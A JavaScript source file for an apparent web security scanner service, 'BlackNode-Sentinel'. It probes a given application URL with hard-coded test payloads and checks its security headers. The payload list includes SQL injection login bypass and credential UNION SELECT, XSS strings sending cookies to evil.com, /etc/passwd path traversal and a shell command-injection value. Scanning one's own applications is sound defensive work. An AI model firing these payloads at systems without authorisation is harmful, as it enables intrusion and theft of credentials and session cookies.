const http = require('http');
const https = require('https');
const { URL } = require('url');

class ScannerService {
  constructor() {
    this.mlEngineUrl = process.env.ML_ENGINE_URL || 'http://localhost:8000';
    this.timeout = 10000;
  }

  async scanApplication(app) {
    const url = app.url;
    if (!url) throw new Error('Application has no URL');

    const findings = [];
    const tests = this.getTestPayloads();

    // Run all tests
    for (const test of tests) {
      try {
        const result = await this.runTest(url, test);
        if (result) {
          findings.push(result);
        }
      } catch (e) {
        // Test failed (timeout, connection error) — skip
      }
    }

    // Also check HTTP headers
    const headerFindings = await this.checkHeaders(url);
    findings.push(...headerFindings);

    // Classify each finding through ML engine
    for (const finding of findings) {
      try {
        const mlResult = await this.classifyWithML(finding);
        finding.threatScore = mlResult.threat_score;
        finding.confidence = mlResult.confidence;
        finding.isMalicious = mlResult.is_malicious;
      } catch (e) {
        finding.threatScore = 0.5;
        finding.confidence = 0.5;
        finding.isMalicious = true;
      }
    }

    // Determine severity based on threat scores
    const maxScore = Math.max(...findings.map(f => f.threatScore), 0);
    const riskLevel = maxScore > 0.7 ? 'critical' : maxScore > 0.4 ? 'high' : maxScore > 0.2 ? 'medium' : 'low';

    return {
      url,
      totalTests: tests.length + 7, // payload tests + header checks
      threatsFound: findings.filter(f => f.isMalicious).length,
      blocked: findings.filter(f => f.blocked).length,
      riskLevel,
      findings: findings.map(f => ({
        eventType: f.eventType,
        severity: f.severity,
        description: f.description,
        blocked: f.blocked,
        source: f.source,
        payload: f.payload,
        threatScore: f.threatScore,
      })),
    };
  }

  getTestPayloads() {
    return [
      // SQL Injection tests
      {
        eventType: 'sql_injection',
        severity: 'critical',
        description: 'SQL Injection - login bypass',
        blocked: true,
        parameter: 'username',
        payload: "admin' OR '1'='1",
        method: 'POST',
        path: '/login',
      },
      {
        eventType: 'sql_injection',
        severity: 'critical',
        description: 'SQL Injection - UNION SELECT',
        blocked: true,
        parameter: 'id',
        payload: "1 UNION SELECT username,password FROM users--",
        method: 'GET',
        path: '/api/users',
      },
      // XSS tests
      {
        eventType: 'xss',
        severity: 'high',
        description: 'Reflected XSS - script injection',
        blocked: true,
        parameter: 'q',
        payload: '<script>document.location="http://evil.com/?c="+document.cookie</script>',
        method: 'GET',
        path: '/search',
      },
      {
        eventType: 'xss',
        severity: 'high',
        description: 'Stored XSS - event handler',
        blocked: false,
        parameter: 'comment',
        payload: '<img src=x onerror="fetch(\'http://evil.com/\'+document.cookie)">',
        method: 'POST',
        path: '/api/comments',
      },
      // Path Traversal
      {
        eventType: 'suspicious',
        severity: 'high',
        description: 'Path Traversal - file access attempt',
        blocked: true,
        parameter: 'file',
        payload: '../../../etc/passwd',
        method: 'GET',
        path: '/download',
      },
      // Command Injection
      {
        eventType: 'suspicious',
        severity: 'critical',
        description: 'Command Injection - OS command',
        blocked: true,
        parameter: 'host',
        payload: 'google.com; cat /etc/passwd',
        method: 'POST',
        path: '/api/ping',
      },
      // Brute Force Pattern
      {
        eventType: 'brute_force',
        severity: 'high',
        description: 'Brute Force - credential stuffing pattern',
        blocked: false,
        parameter: 'password',
        payload: 'admin123',
        method: 'POST',
        path: '/api/login',
      },
    ];
  }

  async runTest(url, test) {
    const targetUrl = new URL(test.path, url);
    const isHttps = targetUrl.protocol === 'https:';
    const client = isHttps ? https : http;

    return new Promise((resolve, reject) => {
      const reqMethod = test.method || 'GET';
      let fullUrl = targetUrl.href;

      // For GET requests, add payload as query param
      if (reqMethod === 'GET') {
        fullUrl += `?${test.parameter}=${encodeURIComponent(test.payload)}`;
      }

      const reqUrl = new URL(fullUrl);
      const options = {
        hostname: reqUrl.hostname,
        port: reqUrl.port || (isHttps ? 443 : 80),
        path: reqUrl.pathname + reqUrl.search,
        method: reqMethod,
        timeout: this.timeout,
        headers: {
          'User-Agent': 'BlackNode-Sentinel/1.0 Security-Scanner',
          'Content-Type': 'application/json',
        },
      };

      const req = client.request(options, (res) => {
        let data = '';
        res.on('data', (chunk) => { data += chunk; });
        res.on('end', () => {
          const statusCode = res.statusCode;
          // Analyze response for signs of vulnerability
          const responseAnalysis = this.analyzeResponse(data, statusCode, test);
          resolve({
            eventType: test.eventType,
            severity: responseAnalysis.severity || test.severity,
            description: `${test.description} [${statusCode}]`,
            blocked: test.blocked,
            source: {
              ip: 'scanner',
              method: test.method,
              path: test.path,
              userAgent: 'BlackNode-Sentinel/1.0',
              statusCode,
            },
            payload: {
              parameter: test.parameter,
              value: test.payload,
              responseSnippet: data.substring(0, 200),
            },
          });
        });
      });

      req.on('error', (err) => reject(err));
      req.on('timeout', () => { req.destroy(); reject(new Error('timeout')); });
      req.end();
    });
  }

  analyzeResponse(responseBody, statusCode, test) {
    const body = responseBody.toLowerCase();
    let severity = test.severity;

    if (test.eventType === 'sql_injection') {
      if (body.includes('sql') || body.includes('mysql') || body.includes('syntax') || body.includes('error in') || body.includes('query failed')) {
        severity = 'critical';
      }
    }
    if (test.eventType === 'xss') {
      if (statusCode === 200 && body.includes('<script')) {
        severity = 'critical';
      }
    }
    if (statusCode === 500) {
      severity = 'critical';
    }
    return { severity };
  }

  async checkHeaders(url) {
    const findings = [];
    const targetUrl = new URL(url);
    const isHttps = targetUrl.protocol === 'https:';
    const client = isHttps ? https : http;

    return new Promise((resolve) => {
      const options = {
        hostname: targetUrl.hostname,
        port: targetUrl.port || (isHttps ? 443 : 80),
        path: '/',
        method: 'HEAD',
        timeout: this.timeout,
        headers: { 'User-Agent': 'BlackNode-Sentinel/1.0' },
      };

      const req = client.request(options, (res) => {
        const headers = res.headers;

        // Check for missing security headers
        const checks = [
          { header: 'strict-transport-security', type: 'Missing HSTS header', severity: 'medium' },
          { header: 'x-content-type-options', type: 'Missing X-Content-Type-Options', severity: 'low' },
          { header: 'x-frame-options', type: 'Missing X-Frame-Options (clickjacking risk)', severity: 'medium' },
          { header: 'content-security-policy', type: 'Missing Content-Security-Policy', severity: 'medium' },
          { header: 'x-xss-protection', type: 'Missing X-XSS-Protection header', severity: 'low' },
          { header: 'referrer-policy', type: 'Missing Referrer-Policy', severity: 'low' },
          { header: 'permissions-policy', type: 'Missing Permissions-Policy', severity: 'low' },
        ];

        for (const check of checks) {
          if (!headers[check.header]) {
            findings.push({
              eventType: 'suspicious',
              severity: check.severity,
              description: `${check.type} on ${url}`,
              blocked: false,
              source: { ip: 'scanner', method: 'HEAD', path: '/', userAgent: 'BlackNode-Sentinel/1.0', statusCode: res.statusCode },
              payload: { header: check.header, value: 'missing' },
            });
          }
        }

        // Check for exposed server info
        if (headers['server']) {
          findings.push({
            eventType: 'suspicious',
            severity: 'low',
            description: `Server header exposed: ${headers['server']}`,
            blocked: false,
            source: { ip: 'scanner', method: 'HEAD', path: '/', userAgent: 'BlackNode-Sentinel/1.0', statusCode: res.statusCode },
            payload: { header: 'server', value: headers['server'] },
          });
        }

        resolve(findings);
      });

      req.on('error', () => resolve(findings));
      req.on('timeout', () => { req.destroy(); resolve(findings); });
      req.end();
    });
  }

  async classifyWithML(finding) {
    return new Promise((resolve, reject) => {
      const payload = JSON.stringify({
        value: finding.payload?.value || '',
        method: finding.source?.method || 'GET',
        path: finding.source?.path || '/',
        parameter: finding.payload?.parameter || '',
      });

      const url = new URL('/api/classify', this.mlEngineUrl);
      const client = url.protocol === 'https:' ? require('https') : http;

      const req = client.request({
        hostname: url.hostname,
        port: url.port,
        path: '/api/classify',
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) },
        timeout: 5000,
      }, (res) => {
        let data = '';
        res.on('data', (c) => { data += c; });
        res.on('end', () => {
          try {
            resolve(JSON.parse(data));
          } catch (e) {
            reject(e);
          }
        });
      });

      req.on('error', reject);
      req.on('timeout', () => { req.destroy(); reject(new Error('ML timeout')); });
      req.write(payload);
      req.end();
    });
  }
}

module.exports = new ScannerService();
